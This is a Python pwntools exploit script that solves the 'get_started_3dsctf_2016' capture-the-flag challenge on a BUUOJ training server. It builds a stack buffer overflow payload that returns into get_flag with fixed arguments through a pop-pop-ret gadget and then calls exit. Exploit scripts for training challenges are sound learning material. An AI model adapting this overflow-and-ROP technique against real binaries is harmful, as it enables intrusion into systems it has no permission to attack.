from pwn import *

'''
    需要注意程序需要保证可以正常退出，否则不输出flag
'''

def get_started_3dsctf_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/get_started_3dsctf_2016'):
    print('get_started_3dsctf_2016 start')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 29190)
    target_elf = ELF(file_name)

    # a1 = 814536271
    # a2 = 425138641

    pop2_ret_gadget = p32(0x0806fc09)  # pop ebx ; pop edx ; ret

    get_flag_ptr = p32(target_elf.symbols['get_flag'])
    exit_ptr = p32(target_elf.symbols['exit'])

    payload = b'A' * 56

    # get_flag(a1=814536271, a2=425138641)
    payload += get_flag_ptr + pop2_ret_gadget + p32(814536271) + p32(425138641)

    # exit(0)
    payload += exit_ptr + p32(0xdeadbeef) + p32(0)

    # gdb.attach(target,'b *0x080489A0')
    target.sendline(payload)

    print(target.recv())

    print('get_started_3dsctf_2016 end')


if __name__ == '__main__':
    get_started_3dsctf_2016()
